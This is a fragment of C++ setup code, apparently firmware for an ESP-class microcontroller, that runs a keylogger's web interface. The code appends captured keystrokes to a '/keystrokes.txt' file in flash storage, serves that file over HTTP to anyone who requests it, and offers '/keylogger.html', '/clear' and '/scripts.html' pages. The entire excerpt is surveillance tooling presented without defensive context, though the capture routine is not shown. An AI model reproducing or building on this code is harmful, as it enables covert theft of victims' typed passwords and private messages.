...
void setup() {
  ...
  a = SPIFFS.open("/keystrokes.txt", "a+");
  if(!a) Serial.println("file open failed");
  ...
  server.on("/keylogger.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_indexHTML, sizeof(data_indexHTML));
    request->send(response);
  });
  ...
  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    a.close();
    a = SPIFFS.open("/keystrokes.txt", "w");
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_indexHTML, sizeof(data_indexHTML));
    request->send(response);
  });

  server.on("/keystrokes.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    a.close();
    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
    a = SPIFFS.open("/keystrokes.txt", "a+");
  });

  server.on("/scripts.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_scriptsHTML, sizeof(data_scriptsHTML));
    request->send(response);
  });
